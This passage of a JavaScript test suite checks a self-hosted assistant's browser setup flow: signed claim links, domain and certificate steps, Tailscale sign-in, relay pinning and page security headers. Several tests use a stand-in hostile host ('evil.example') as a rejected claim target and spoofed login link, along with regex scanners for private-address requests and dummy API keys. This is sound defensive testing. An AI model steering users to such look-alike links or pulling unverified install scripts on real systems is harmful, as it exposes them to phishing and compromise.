  const msg = (r, c, h) => Buffer.concat([Buffer.from(`vyre-setup-claim\n${r}\n`), Buffer.from(c, "base64url"), Buffer.from(`\n${h}`)]);
  const ok = (r, h) => crypto.verify("sha256", msg(r, challenge, h), { key: pub, dsaEncoding: "ieee-p1363" }, raw.subarray(32));
  assert.equal(ok(route, "harlow.vyre.run"), true);
  assert.equal(ok(route, "other.vyre.run"), false, "another name never verifies");
  assert.equal(ok("s".repeat(26), "harlow.vyre.run"), false, "another box never verifies");
  await assert.rejects(signClaim({ privateKey: key.privateKey, route, challenge: "AAAA", host: "harlow.vyre.run" }), /32 bytes/);
  await assert.rejects(signClaim({ privateKey: key.privateKey, route, challenge, host: "evil.example" }), /vyre\.run/);
  assert.equal(key.privateKey.extractable, false);
});

async function atClaim(t, box) {
  const flow = await atDevices(t, box);
  flow.continueToClaim();
  return flow;
}

test("claim: a fresh link carries the signed token in the fragment only, runs out after its time, and a new one replaces it", async t => {
  const box = stepsBox({ claimMs: 250 });
  const flow = await atClaim(t, box);
  assert.equal(flow.state.stage, "claim");
  await flow.mintClaim();
  assert.equal(flow.state.claim.phase, "ready");
  const u = new URL(flow.state.claim.url);
  assert.equal(u.origin, "https://harlow-legal-server.vyre.run");
  assert.equal(u.pathname, "/onboard/passkey", "the passkey page, not the Deck at /, which does not read a claim");
  assert.equal(u.search, "", "nothing in the query, where a server would log it");
  assert.match(u.hash, /^#claim=[A-Za-z0-9_-]{128}&spki=[A-Za-z0-9_-]{122}$/, "the token and the page key are in the fragment");
  assert.deepEqual(box.calls.filter(c => c[0] === "relay.setup.claim-token").map(c => c[1]), [{ host: "harlow-legal-server.vyre.run" }]);
  await until(() => flow.state.claim.phase === "expired", 3000);
  assert.equal(flow.state.claim.url, null, "an expired link is no longer shown");
  await flow.mintClaim();
  assert.equal(flow.state.claim.phase, "ready");
  flow.stop();

  const bad = stepsBox({ claimFails: true });
  const f2 = await atClaim(t, bad);
  await f2.mintClaim();
  assert.equal(f2.state.claim.phase, "failed");
  assert.match(f2.state.claim.error, /has ended/);
  f2.stop();
});

test("claim: the setup ending before its hour means claimed and ends the page on 'You're in'; at the hour it is an expiry", async t => {
  // The channel closing (the box closes it with 4401 when the session ends) before the hour: claimed.
  const box = stepsBox();
  let closed = () => {};
  box.onClose = cb => { closed = cb; };
  const flow = await atClaim(t, box);
  await flow.mintClaim();
  closed(4401, "setup ended");
  assert.equal(flow.state.stage, "done");
  flow.stop();

  // A 401 setup_over on the page's own poll says the same.
  const b2 = stepsBox();
  const f2 = await atClaim(t, b2);
  const orig = b2.call;
  b2.call = async (tool, input) => { if (tool === "relay.setup.status") throw Object.assign(new Error("this setup session has ended"), { code: "setup_over", status: 401 }); return orig(tool, input); };
  await until(() => f2.state.stage === "done");
  f2.stop();

  // At (or after) the hour the same signal is an expiry.
  let clock = Date.now();
  const b3 = stepsBox();
  let closed3 = () => {};
  b3.onClose = cb => { closed3 = cb; };
  const late = createFlow({ client: clientWith(async () => offer()), relay: (await world(t)).base, sleep: fastSleep, pollMs: 5, debounceMs: 1, now: () => clock, connect: async () => b3, signClaim });
  await late.begin();
  await until(() => late.state.stage === "found");
  late.confirmWords();
  await until(() => late.state.naming.check);
  await late.claim(); late.markSaved(); late.continueToTailscale();
  b3.st.ts = "connected"; b3.st.claimPhase = "serving";
  await until(() => late.state.tailscale.address && late.state.tailscale.address.phase === "serving");
  late.continueToAi(); late.skipAi(); late.continueToClaim();
  clock += 61 * 60_000;
  closed3(4401, "setup ended");
  assert.equal(late.state.stage, "stopped");
  assert.equal(late.state.error.message, MESSAGES.expired);
  late.stop();
});

test("claim: the screen offers the link as a real anchor to the person's own address, and a code for a phone", async t => {
  const box = stepsBox();
  const doc = new FakeDoc(), root = doc.createElement("main");
  const qr = [];
  let flow;
  const actions = { begin() {}, copy() {}, setName() {}, claim() {}, confirmWords: () => flow.confirmWords(), denyWords() {}, markSaved: () => flow.markSaved(),
    continueToAi: () => flow.continueToAi(), continueToTailscale: () => flow.continueToTailscale(), connectTailscale() {}, startAi: p => flow.startAi(p), submitAiCode() {},
    continueToDevices: () => flow.continueToDevices(), addPhone() {}, drawRing() {}, continueToClaim: () => flow.continueToClaim(), mintClaim: () => flow.mintClaim(), drawQr: (slot, text) => qr.push(text) };
  const w = await world(t);
  flow = createFlow({ client: clientWith(async () => offer()), relay: w.base, sleep: fastSleep, pollMs: 5, debounceMs: 1, connect: async () => box, signClaim,
    onChange: s => render(s, { doc: /** @type {any} */ (doc), root: /** @type {any} */ (root), actions }) });
  await flow.begin();
  await until(() => flow.state.stage === "found");
  flow.confirmWords();
  await until(() => flow.state.naming.check);
  await flow.claim(); flow.markSaved(); flow.continueToTailscale();
  box.st.ts = "connected"; box.st.claimPhase = "serving";
  await until(() => flow.state.tailscale.address && flow.state.tailscale.address.phase === "serving");
  flow.continueToAi(); flow.skipAi();
  root.all().find(e => e.tag === "button" && e.children.some(c => c.value === "Skip for now")).listeners.click();
  assert.equal(flow.state.stage, "claim");
  root.all().find(e => e.tag === "button" && e.children.some(c => c.value === "Get my link")).listeners.click();
  await until(() => flow.state.claim.phase === "ready");
  const a = root.all().find(e => e.tag === "a" && e.attrs.href && e.attrs.href.includes("#claim="));
  assert.ok(a, "the link");
  assert.equal(a.attrs.href, flow.state.claim.url);
  assert.ok(a.attrs.href.startsWith("https://harlow-legal-server.vyre.run/onboard/passkey#claim="));
  assert.ok(!root.textContent.includes("#claim="), "the token is in the href, never printed as text");
  assert.deepEqual(qr, [flow.state.claim.url], "the phone's code is drawn from the same link, once");
  flow.stop();
});

// ---- a DOM just big enough to check what the screen makes ----
class FakeEl {
  constructor(tag, doc) { this.tag = tag; this.doc = doc; this.attrs = {}; this.children = []; this.text = null; this.listeners = {}; }
  setAttribute(k, v) { this.attrs[k] = String(v); }
  getAttribute(k) { return k in this.attrs ? this.attrs[k] : null; }
  appendChild(c) { this.children.push(c); return c; }
  replaceChildren(...c) { this.children = c; }
  addEventListener(n, f) { this.listeners[n] = f; }
  removeAttribute(k) { delete this.attrs[k]; }
  querySelector(sel) { return this.all().find(e => e.tag === sel) || null; }
  focus() {}
  all() { return this.children.flatMap(c => c instanceof FakeEl ? [c, ...c.all()] : []); }
  get textContent() { return this.children.map(c => (c instanceof FakeEl ? c.textContent : c.value)).join(" "); }
  set innerHTML(_) { this.doc.innerHtmlWrites++; }
  set textContent(v) { this.children = [{ value: String(v) }]; }
}
class FakeDoc {
  constructor() { this.innerHtmlWrites = 0; }
  createElement(tag) { return new FakeEl(tag, this); }
  createTextNode(value) { return { value }; }
}
void h;

test("site: the relay client copied the way build-site.sh does it loads on its own, with no import from outside its folder", async t => {
  const fs = await import("node:fs"), os = await import("node:os"), path = await import("node:path"), url = await import("node:url");
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "vyre-site-"));
  t.after(() => fs.rmSync(dir, { recursive: true, force: true }));
  const src = path.join(path.dirname(url.fileURLToPath(import.meta.url)), "..", "..", "relay", "client");
  fs.mkdirSync(path.join(dir, "relay"));
  for (const f of fs.readdirSync(src)) if (f.endsWith(".js") && !f.endsWith(".test.js")) fs.copyFileSync(path.join(src, f), path.join(dir, "relay", f));
  fs.writeFileSync(path.join(dir, "package.json"), '{"type":"module"}');
  const m = await import(url.pathToFileURL(path.join(dir, "relay", "setup.js")).href);
  for (const name of ["createSetupKey", "setupCode", "resolveSetup", "setupWords", "mailboxReader"]) assert.equal(typeof m[name], "function", name);
  // and the page's own files import nothing at all except the client (page.js) and each other
  const page = fs.readFileSync(path.join(path.dirname(url.fileURLToPath(import.meta.url)), "page.js"), "utf8");
  assert.deepEqual([...page.matchAll(/^import .* from "([^"]+)"/gm)].map(x => x[1]).sort(), ["./box.js", "./claim.js", "./config.js", "./deck/js/phone-code.js", "./deck/vendor/qrcode.js", "./flow.js", "./relay/bytes.js", "./relay/client.js", "./relay/setup.js", "./relay/webcrypto.js", "./ui.js"]);
});

test("site: the setup page loads nothing from another origin, and its headers say so", async () => {
  const fs = await import("node:fs"), path = await import("node:path"), url = await import("node:url");
  const here = path.dirname(url.fileURLToPath(import.meta.url));
  const html = fs.readFileSync(path.join(here, "index.html"), "utf8");
  const css = fs.readFileSync(path.join(here, "setup.css"), "utf8");
  for (const [name, text] of [["index.html", html], ["setup.css", css]]) assert.ok(!/https?:\/\/(?!vyre\.run)/.test(text.replace(/<link rel="icon"[^>]*>/, "")), `${name} names no other origin`);
  assert.ok(!/inline|<script>(?!<)/.test(html.replace(/<script type="module" src="[^"]+"><\/script>/, "")), "no inline script");
  const headers = fs.readFileSync(path.join(here, "..", "_headers"), "utf8");
  for (const want of ["default-src 'none'", "script-src 'self'", "style-src 'self'", "font-src 'self'", "object-src 'none'", "worker-src 'none'", "Cross-Origin-Opener-Policy: same-origin", "Permissions-Policy: camera=(), microphone=(), geolocation=(), clipboard-read=()"]) assert.ok(headers.includes(want), want);
  assert.ok(!headers.includes("googleapis") && !headers.includes("gstatic"));
  assert.match(headers, /^\/setup\n/m, "the redirect from /setup carries the headers too");
});

test("domain: after the recovery code is saved, a domain of the person's own is looked up by the box, and an old answer never sits beside new text", async t => {
  let seen = 0;
  const box = fakeBox({ domain: d => { seen++; if (d === "bad.example") throw new Error("that is not a domain of your own");
    return { domain: d, ok: seen > 1, cname: { host: `_acme-challenge.${d}`, expected: "abc123.acme.vyre.run", found: seen > 1 ? ["abc123.acme.vyre.run"] : [], ok: seen > 1 }, caa: { host: d, present: false, found: [], expected: null, ok: null, optional: true } }; } });
  const flow = await foundFlow(t, box);
  await until(() => flow.state.naming.check);
  await flow.claim();
  await flow.checkDomain("harlowlegal.com");
  assert.equal(box.calls.filter(c => c[0] === "names.domain.check").length, 0, "not before the recovery code is saved");
  flow.markSaved();
  const doc = new FakeDoc(), root = doc.createElement("main");
  const actions = { begin() {}, copy() {}, setName() {}, claim() {}, confirmWords() {}, denyWords() {}, markSaved() {}, openDomain: o => flow.openDomain(o), setDomain: x => flow.setDomain(x), checkDomain: () => flow.checkDomain() };
  const draw = () => render(flow.state, { doc: /** @type {any} */ (doc), root: /** @type {any} */ (root), actions });
  draw();
  root.all().find(e => e.tag === "button" && e.children.some(c => c.value === "Use a domain of your own too")).listeners.click();
  assert.equal(flow.state.domain.open, true);
  flow.setDomain("https://HarlowLegal.com/");
  await flow.checkDomain();
  assert.equal(flow.state.domain.input, "harlowlegal.com", "tidied: no scheme, no slash, lower case");
  assert.deepEqual(box.calls.filter(c => c[0] === "names.domain.check").map(c => c[1]), [{ domain: "harlowlegal.com" }]);
  assert.equal(flow.state.domain.result.ok, false);
  draw();
  assert.ok(root.textContent.includes("_acme-challenge.harlowlegal.com  CNAME  abc123.acme.vyre.run"), "the record to add, from the box's own answer");
  assert.ok(root.textContent.includes("not there yet"));
  await flow.checkDomain();
  assert.equal(flow.state.domain.result.ok, true);
  draw();
  assert.ok(root.textContent.includes("The record is in place."));
  flow.setDomain("other.com");
  assert.equal(flow.state.domain.result, null, "typing again drops the old answer");
  await flow.checkDomain("not a domain");
  assert.match(flow.state.domain.error, /does not look like a domain/);
  await flow.checkDomain("bad.example");
  assert.equal(flow.state.domain.error, "that is not a domain of your own", "the box's refusal is shown in its words");
  flow.stop();
});

test("steps: a sign-in that fails while the page polls shows the box's message (message, as core/sessions/signin.js answers it)", async t => {
  const box = stepsBox({ ts: "connected" });
  const flow = await atNamed(t, box);
  try {
    await toAi(flow, box);
    flow.startAi("codex");
    await until(() => box.st.flows["f-codex"]);
    box.st.flows["f-codex"].failStatus = true;
    const failed = await until(() => flow.state.ai.accounts.find(a => a.provider === "codex" && a.step === "failed"));
    assert.equal(failed.error, "the sign-in page was closed before it finished");
  } finally { flow.stop(); }
});

test("steps: the address goes from certificate to serving on the certificate's own event (no tailscale.changed), and a certificate failure is shown", async t => {
  const box = stepsBox({ ts: "connected", claimPhase: "certificate" });
  const flow = await atNamed(t, box);
  try {
    flow.continueToTailscale();
    await until(() => flow.state.tailscale.address && flow.state.tailscale.address.phase === "certificate");
    // Another name's certificate is not this box's.
    box.st.events = [{ id: 3, type: "certificate.issued", payload: { name: "someone-else.vyre.run" } }];
    await new Promise(r => setTimeout(r, 1500));
    assert.equal(flow.state.tailscale.address.phase, "certificate");
    // The box's own certificate, issued: serving, and the watching ends.
    box.st.events.push({ id: 4, type: "certificate.issued", payload: { name: "harlow-legal-server.vyre.run", expires: 1 } });
    await until(() => flow.state.tailscale.address.phase === "serving", 8000);
  } finally { flow.stop(); }

  const bad = stepsBox({ ts: "connected", claimPhase: "certificate" });
  const f2 = await atNamed(t, bad);
  try {
    f2.continueToTailscale();
    await until(() => f2.state.tailscale.address && f2.state.tailscale.address.phase === "certificate");
    bad.st.events = [{ id: 1, type: "certificate.failed", payload: { name: "harlow-legal-server.vyre.run", why: "the certificate authority said no" } }];
    await until(() => f2.state.tailscale.address.phase === "failed", 8000);
    assert.equal(f2.state.tailscale.address.why, "the certificate authority said no");
  } finally { f2.stop(); }
});

test("steps: names.status is the backstop: serving (or failed) on the box's own answer even when no event is ever seen; a box without that tool still works", async t => {
  const box = stepsBox({ ts: "connected", claimPhase: "certificate" });
  const flow = await atNamed(t, box);
  try {
    flow.continueToTailscale();
    await until(() => flow.state.tailscale.address && flow.state.tailscale.address.phase === "certificate");
    box.st.namesPhase = "certificate";
    await new Promise(r => setTimeout(r, 1300));
    assert.equal(flow.state.tailscale.address.phase, "certificate", "still going");
    box.st.namesPhase = "serving";
    await until(() => flow.state.tailscale.address.phase === "serving", 8000);
  } finally { flow.stop(); }
  const bad = stepsBox({ ts: "connected", claimPhase: "certificate", namesPhase: "failed", namesWhy: "the certificate authority is unreachable" });
  const f2 = await atNamed(t, bad);
  try {
    f2.continueToTailscale();
    await until(() => f2.state.tailscale.address && f2.state.tailscale.address.phase === "failed", 8000);
    assert.equal(f2.state.tailscale.address.why, "the certificate authority is unreachable");
  } finally { f2.stop(); }
});

test("steps: a sign-in link that is not Tailscale's is shown as a refusal with the Connect button back, not left on Getting the link", async t => {
  const box = stepsBox({ loginUrl: "https://evil.example/login" });
  const doc = new FakeDoc(), root = doc.createElement("main");
  let flow;
  const actions = { begin() {}, copy() {}, setName() {}, claim() {}, confirmWords: () => flow.confirmWords(), denyWords() {}, markSaved: () => flow.markSaved(),
    continueToAi: () => flow.continueToAi(), continueToTailscale: () => flow.continueToTailscale(), connectTailscale: () => flow.connectTailscale(), startAi: p => flow.startAi(p), submitAiCode: (i, c) => flow.submitAiCode(i, c) };
  const w = await world(t);
  flow = createFlow({ client: clientWith(async () => offer()), relay: w.base, sleep: fastSleep, pollMs: 5, debounceMs: 1, connect: async () => box,
    onChange: s => render(s, { doc: /** @type {any} */ (doc), root: /** @type {any} */ (root), actions }) });
  try {
    await flow.begin();
    await until(() => flow.state.stage === "found");
    flow.confirmWords();
    await until(() => flow.state.naming.check);
    await flow.claim(); flow.markSaved(); flow.continueToTailscale();
    await until(() => flow.state.tailscale.status);
    const button = () => root.all().find(e => e.tag === "button" && e.children.some(c => /Connect my server|Getting the link/.test(String(c.value))));
    await button().listeners.click();
    assert.equal(flow.state.tailscale.busy, false, "the busy state is cleared");
    assert.match(flow.state.tailscale.error, /not Tailscale's/);
    assert.ok(!root.textContent.includes("Getting the link"), "not left waiting");
    assert.ok(root.textContent.includes("that is not Tailscale's"), "the refusal is on the screen");
    assert.ok(root.textContent.includes("Connect my server"), "and the person can try again");
    assert.ok(!root.all().some(e => e.tag === "a" && /evil\\.example/.test(String(e.attrs.href))), "the link is never an anchor");
  } finally { flow.stop(); }
});

test("a browser with no X25519 stops at the start with a named message, not a server error", async t => {
  const w = await world(t);
  const flow = createFlow({ client: clientWith(async () => offer()), relay: w.base, sleep: fastSleep, pollMs: 5, debounceMs: 1, supported: async () => { throw new Error("NotSupportedError"); } });
  await flow.begin();
  assert.equal(flow.state.stage, "stopped");
  assert.equal(flow.state.error.code, "browser");
  assert.match(flow.state.error.message, /Chrome 133/);
  flow.stop();
});

test("machine: the start screen offers a Linux server or a Mac, the choice reaches the install screen, and Start again keeps it", async t => {
  const w = await world(t);
  const flow = createFlow({ client: clientWith(async () => { throw Object.assign(new Error("gone"), { code: "ticket_gone" }); }), relay: w.base, sleep: fastSleep, pollMs: 5 });
  const doc = new FakeDoc();
  const root = doc.createElement("main");
  /** @type {any[]} */ const begun = [];
  const actions = { begin: m => begun.push(m), copy() {}, setName() {}, claim() {}, confirmWords() {}, denyWords() {}, markSaved() {} };
  const draw = () => render(flow.state, { doc: /** @type {any} */ (doc), root: /** @type {any} */ (root), actions });
  draw();
  const buttons = () => root.all().filter(e => e.tag === "button");
  const labels = buttons().map(b => b.textContent);
  assert.deepEqual(labels, ["A Linux server", "A Mac that stays on"]);
  buttons()[1].listeners.click();
  assert.deepEqual(begun, ["mac"], "the Mac button asks for the Mac");
  await flow.begin("mac");
  assert.equal(flow.state.machine, "mac");
  draw();
  assert.match(root.textContent, /Run the line on the Mac/);
  assert.match(root.textContent, /with FileVault on, the Mac waits for someone to unlock it at the screen, and Vyre is off until then/);
  assert.match(root.textContent, /anyone who takes the Mac can read Vyre's files, notes and conversations; the vault stays locked behind its password/);
  assert.match(root.textContent, /"Start up automatically after a power failure" is on in System Settings, under Energy, and it starts off on a Mac mini/);
  assert.ok(flow.state.installLine.startsWith("curl -fsSL "), "the same one line: the script on the Mac picks the Mac install");
  await flow.begin();
  assert.equal(flow.state.machine, "mac", "Start again keeps the choice");
  await flow.begin("linux");
  draw();
  assert.match(root.textContent, /Run the line on your server/);
  assert.ok(!/FileVault/.test(root.textContent), "no Mac words on a Linux install");
  flow.stop();
});

test("relay pin: the page connects to the box only through its own relay, never to another host the offer names (no Local Network Access prompt)", async t => {
  const w = await world(t);
  let connects = 0;
  const mk = relayInOffer => createFlow({ client: clientWith(async () => ({ ...offer(), offer: { ...offer().offer, relay: relayInOffer } })), relay: w.base, pinRelay: true, sleep: fastSleep, pollMs: 5, debounceMs: 1,
    connect: async () => { connects++; return { call: async () => ({}), events: async () => [], follow: () => () => {}, onClose() {}, close() {} }; } });
  for (const bad of ["wss://192.168.1.20", "wss://localhost:8443", "wss://box.vyre.run", "wss://relay.vyre.run", "ws://10.0.0.5", "not a url"]) {
    const flow = mk(bad);
    await flow.begin();
    await until(() => flow.state.stage === "found");
    flow.confirmWords();
    await until(() => flow.state.channel === "failed" || flow.state.stage === "stopped");
    assert.equal(flow.state.channel, "failed", bad);
    flow.stop();
  }
  assert.equal(connects, 0, "nothing connected to any of them");
  const good = mk(w.base);
  await good.begin();
  await until(() => good.state.stage === "found");
  good.confirmWords();
  await until(() => connects === 1);
  good.stop();
});

test("the setup page's own code makes no request to a private address: its only fetches are same-origin paths", () => {
  const dir = new URL(".", import.meta.url).pathname;
  for (const f of fs.readdirSync(dir).filter(n => n.endsWith(".js") && !n.endsWith(".test.js"))) {
    const text = fs.readFileSync(path.join(dir, f), "utf8");
    for (const m of text.matchAll(/\bfetch\(\s*([^,)]+)/g)) {
      if (/^(o\.fetch|opts|globalThis)/.test(m[1])) continue;
      assert.match(m[1].trim(), /^["'`]\/(?!\/)/, `${f}: fetch(${m[1]}) is not a same-origin path`);
    }
    assert.ok(!/XMLHttpRequest|sendBeacon|new EventSource/.test(text), `${f} opens a request of another kind`);
    assert.ok(!/["'`](?:https?|wss?):\/\/(?:localhost|127\.|10\.|192\.168\.|172\.(?:1[6-9]|2\d|3[01])\.|169\.254\.|\[?::1)/.test(text.replace(/\/\/.*$/gm, "")), `${f} names a private address`);
  }
});

test("timeline: ten steps in order, the current one from the flow's stage, optional ones tagged, skipped ones stay listed", async t => {
  const { stepList, stepNumber, STEPS } = await import("./flow.js");
  assert.deepEqual(STEPS.map(x => x.title), ["Install", "Check the words", "Choose your address", "Connect Tailscale", "Sign in to your AI", "Add your phone", "Create your passkey", "You and your assistant", "Your computers", "Your history"]);
  assert.deepEqual(STEPS.filter(x => x.optional).map(x => x.id), ["phone", "computers", "history"]);
  const box = stepsBox();
  const flow = await atNamed(t, box);
  assert.equal(stepNumber(flow.state), 3);
  assert.deepEqual(stepList(flow.state).map(x => x.status).join(","), "done,done,current,todo,todo,todo,todo,todo,todo,todo");
  await toAi(flow, box);
  assert.equal(stepNumber(flow.state), 5);
  flow.skipAi();
  assert.equal(flow.state.stage, "devices", "no AI yet is allowed, and it goes on to the phone");
  assert.deepEqual(flow.state.skipped, ["ai"]);
  flow.continueToClaim();
  const l = stepList(flow.state);
  assert.equal(l[4].status, "skipped");
  assert.equal(l[5].status, "skipped", "a phone not added is skipped too");
  assert.equal(l[6].status, "current");
  assert.equal(stepNumber(flow.state), 7);
  flow.stop();
});

test("timeline: skipping the AI is refused once one is signed in, and a stopped page marks the step it stopped on", async t => {
  const { stepList } = await import("./flow.js");
  const box = stepsBox();
  const flow = await atNamed(t, box);
  await toAi(flow, box);
  flow.startAi("codex");
  await until(() => flow.state.ai.accounts[0] && flow.state.ai.accounts[0].step === "done");
  flow.skipAi();
  assert.equal(flow.state.stage, "ai", "a signed-in AI is not skipped");
  flow.stop();
  const f2 = createFlow({ client: clientWith(async () => offer()), relay: "ws://127.0.0.1:1", supported: async () => false });
  await f2.begin();
  assert.equal(f2.state.stage, "stopped");
});

test("timeline: the screen draws the same ten steps as a rail and as a bar, with the current one marked and all text as text", async t => {
  const box = stepsBox();
  const doc = new FakeDoc(), root = doc.createElement("main");
  let flow;
  const actions = { begin() {}, copy() {}, setName() {}, claim() {}, confirmWords: () => flow.confirmWords(), denyWords() {}, markSaved: () => flow.markSaved(), continueToTailscale: () => flow.continueToTailscale() };
  const w = await world(t);
  flow = createFlow({ client: clientWith(async () => offer()), relay: w.base, sleep: fastSleep, pollMs: 5, debounceMs: 1, connect: async () => box,
    onChange: s => render(s, { doc: /** @type {any} */ (doc), root: /** @type {any} */ (root), actions }) });
  await flow.begin();
  await until(() => flow.state.stage === "found");
  assert.ok(root.textContent.includes("Step 2 of 10"));
  assert.ok(root.textContent.includes("Check the four words"));
  flow.confirmWords();
  await until(() => flow.state.naming.check);
  assert.ok(root.textContent.includes("Step 3 of 10"));
  const rail = root.all().find(e => e.attrs && e.attrs.class === "tl-rail");
  const items = rail.all().filter(e => e.tag === "li" && String(e.attrs.class).startsWith("tl-step"));
  assert.equal(items.length, 10);
  assert.equal(items.filter(e => e.attrs["aria-current"] === "step").length, 1);
  assert.equal(doc.innerHtmlWrites, 0);
  flow.stop();
});

test("activity: each step leaves one line in the page's own words, and a forged progress line never becomes one", async t => {
  const box = stepsBox();
  const flow = await atNamed(t, box);
  assert.ok(flow.state.activity.includes("The four words matched."));
  assert.ok(flow.state.activity.includes("Connected to your server."));
  assert.ok(flow.state.activity.some(l => /^Claimed .+\.vyre\.run\.$/.test(l)));
  await toAi(flow, box);
  assert.ok(flow.state.activity.includes("Your server joined Tailscale."));
  assert.ok(flow.state.activity.includes("Your address is live."));
  flow.skipAi();
  assert.ok(flow.state.activity.some(l => l.startsWith("Skipped the AI sign-in")));
  assert.equal(new Set(flow.state.activity).size, flow.state.activity.length, "no line twice");
});

test("steps: an API key is sent once, never kept in the page's state, and an error never carries it", async t => {
  const box = stepsBox();
  const flow = await atNamed(t, box);
  await toAi(flow, box);
  flow.openAiKey("nope");
  assert.equal(flow.state.ai.keyKind, null, "only the three kinds open");
  flow.openAiKey("openai-compatible");
  assert.equal(flow.state.ai.keyKind, "openai-compatible");
  flow.openAiKey("openai-compatible");
  assert.equal(flow.state.ai.keyKind, null, "the same kind again closes it");
  flow.openAiKey("openai-compatible");
  await flow.submitAiKey({ kind: "openai-compatible", key: "short" });
  assert.equal(flow.state.ai.accounts.at(-1).step, "failed");
  assert.ok(!box.calls.some(c => c[0] === "sessions.accounts.key"), "a key that cannot be one never leaves the page");
  await flow.submitAiKey({ kind: "openai-compatible", key: "sk-refused-key-123456", base_url: "https://llm.example.org/v1" });
  const failed = flow.state.ai.accounts.at(-1);
  assert.equal(failed.step, "failed");
  assert.ok(!JSON.stringify(flow.state).includes("sk-refused-key-123456"), "neither the state nor the error holds the key");
  assert.equal(flow.state.ai.keyBusy, false);
  await flow.submitAiKey({ kind: "openai-compatible", key: "sk-good-key-1234567890", base_url: "https://llm.example.org/v1", model: "m1" });
  const call = box.calls.filter(c => c[0] === "sessions.accounts.key").at(-1);
  assert.deepEqual(call[1], { kind: "openai-compatible", key: "sk-good-key-1234567890", base_url: "https://llm.example.org/v1", model: "m1" });
  assert.equal(flow.state.ai.accounts.at(-1).step, "done");
  assert.equal(flow.state.ai.keyKind, null, "the form closes on success");
  assert.ok(!JSON.stringify(flow.state).includes("sk-good-key-1234567890"), "the saved key is not in the state");
  flow.continueToDevices();
  assert.equal(flow.state.stage, "devices", "a saved key counts as one AI to go on with");
  flow.stop();
});
